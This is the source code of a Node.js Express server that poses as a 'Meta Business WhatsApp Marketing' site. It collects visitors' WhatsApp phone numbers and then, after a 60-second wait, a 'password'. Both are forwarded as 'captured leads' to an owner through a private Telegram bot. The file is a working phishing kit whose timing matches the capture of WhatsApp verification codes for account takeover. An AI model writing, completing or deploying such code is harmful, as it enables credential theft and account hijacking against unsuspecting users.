const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Setup
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const OWNER_CHAT_ID = process.env.OWNER_CHAT_ID;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Store temporary data (in production, use Redis or database)
const userSessions = new Map();

// ========== TELEGRAM BOT COMMANDS ==========

// Start command - Only owner can use
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name;

    if (chatId.toString() !== OWNER_CHAT_ID) {
        bot.sendMessage(chatId, 
            '⛔ *ACCESS DENIED*\n\n' +
            'Sorry, you are not authorized to use this bot.\n' +
            'This bot is exclusively for the owner.',
            { parse_mode: 'Markdown' }
        );
        return;
    }

    bot.sendMessage(chatId,
        '👋 *Welcome Boss!*\n\n' +
        '🤖 *Meta Business Bot* is now active!\n\n' +
        '📊 *Commands:*\n' +
        '• /status - Check bot status\n' +
        '• /leads - View all captured leads\n' +
        '• /clear - Clear all leads\n' +
        '• /help - Show help',
        { parse_mode: 'Markdown' }
    );
});

// Status command
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_CHAT_ID) {
        bot.sendMessage(chatId, '⛔ Access Denied!');
        return;
    }

    const activeSessions = userSessions.size;
    bot.sendMessage(chatId,
        '📊 *Bot Status*\n\n' +
        `✅ Bot is running\n` +
        `👥 Active Sessions: ${activeSessions}\n` +
        `🌐 Server Port: ${PORT}\n` +
        `⏰ Time: ${new Date().toLocaleString()}`,
        { parse_mode: 'Markdown' }
    );
});

// Leads command
bot.onText(/\/leads/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_CHAT_ID) {
        bot.sendMessage(chatId, '⛔ Access Denied!');
        return;
    }

    if (userSessions.size === 0) {
        bot.sendMessage(chatId, '📭 No leads captured yet.');
        return;
    }

    let message = '📋 *All Captured Leads:*\n\n';
    let count = 1;

    userSessions.forEach((data, id) => {
        message += `${count}. 📱 *Number:* ${data.phone}\n`;
        message += `   🔑 *Password:* ${data.password}\n`;
        message += `   ⏰ *Time:* ${data.timestamp}\n\n`;
        count++;
    });

    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// Clear command
bot.onText(/\/clear/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_CHAT_ID) {
        bot.sendMessage(chatId, '⛔ Access Denied!');
        return;
    }

    userSessions.clear();
    bot.sendMessage(chatId, '🗑️ All leads cleared successfully!');
});

// Help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_CHAT_ID) {
        bot.sendMessage(chatId, '⛔ Access Denied!');
        return;
    }

    bot.sendMessage(chatId,
        '❓ *Help Menu*\n\n' +
        '*Available Commands:*\n' +
        '• /start - Start the bot\n' +
        '• /status - Check bot status\n' +
        '• /leads - View all captured leads\n' +
        '• /clear - Clear all leads\n' +
        '• /help - Show this menu\n\n' +
        '*How it works:*\n' +
        '1. User visits your website\n' +
        '2. Enters WhatsApp number\n' +
        '3. Waits 60 seconds\n' +
        '4. Enters password\n' +
        '5. You get notified instantly!',
        { parse_mode: 'Markdown' }
    );
});

// Handle unauthorized messages
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_CHAT_ID && !msg.text?.startsWith('/')) {
        bot.sendMessage(chatId,
            '⛔ *ACCESS DENIED*\n\n' +
            'This bot is private and only accessible by the owner.',
            { parse_mode: 'Markdown' }
        );
    }
});

// ========== API ENDPOINTS ==========

// Submit phone number
app.post('/api/submit-phone', (req, res) => {
    const { phone, sessionId } = req.body;

    if (!phone || !sessionId) {
        return res.status(400).json({ success: false, message: 'Phone and sessionId required' });
    }

    // Store phone number
    userSessions.set(sessionId, {
        phone: phone,
        password: null,
        timestamp: new Date().toLocaleString(),
        step: 'phone_submitted'
    });

    // Send to Telegram owner
    bot.sendMessage(OWNER_CHAT_ID,
        '📱 *NEW LEAD - Phone Number*\n\n' +
        `📞 Number: ${phone}\n` +
        `⏰ Time: ${new Date().toLocaleString()}\n\n` +
        '⏳ Waiting for password...',
        { parse_mode: 'Markdown' }
    );

    res.json({ success: true, message: 'Phone number submitted' });
});

// Submit password
app.post('/api/submit-password', (req, res) => {
    const { password, sessionId } = req.body;

    if (!password || !sessionId) {
        return res.status(400).json({ success: false, message: 'Password and sessionId required' });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
        return res.status(400).json({ success: false, message: 'Session not found' });
    }

    // Update session with password
    session.password = password;
    session.step = 'completed';

    // Send complete lead to Telegram owner
    bot.sendMessage(OWNER_CHAT_ID,
        '✅ *COMPLETE LEAD CAPTURED!*\n\n' +
        `📞 WhatsApp Number: ${session.phone}\n` +
        `🔑 Password: ${password}\n` +
        `⏰ Time: ${new Date().toLocaleString()}\n\n` +
        '📲 *Action Required:*\n' +
        'Contact the user on WhatsApp and verify the password to add them to your community!',
        { parse_mode: 'Markdown' }
    );

    res.json({ success: true, message: 'Password submitted successfully' });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log('╔════════════════════════════════════════╗');
    console.log('║     META BUSINESS WHATSAPP MARKETING   ║');
    console.log('║            Server Started!             ║');
    console.log('╚════════════════════════════════════════╝');
    console.log(`🌐 Server running on port: ${PORT}`);
    console.log(`🤖 Telegram Bot: Active`);
    console.log(`👤 Owner ID: ${OWNER_CHAT_ID}`);
    console.log('');
    console.log('📖 To get your Telegram User ID:');
    console.log('   1. Message @userinfobot on Telegram');
    console.log('   2. Copy your ID and paste in .env file');
    console.log('');
});

module.exports = app;
